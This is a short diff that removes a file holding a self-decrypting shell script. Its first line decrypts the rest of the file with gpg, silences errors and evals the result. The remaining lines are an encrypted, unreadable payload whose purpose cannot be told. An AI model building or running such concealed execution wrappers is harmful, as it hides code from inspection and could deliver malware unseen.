@@ -1,3 +1,0 @@
-eval "$((dd if=$0 bs=1 skip=59|gpg -d)2>/dev/null)"; exit;
-Œé—)	ðM~òÒ\(YéthÀ±öÀ#\¬“`¶A	C¤ÅõFðÐAôe
-¼ ÞRO£ñZ¡á-_p\ÕÃegë£FLùÝn‚˜ŸÿˆµÂ¾»Qû¼ñ¶;ûUwéT2ÈÚŒM“1Ãõ
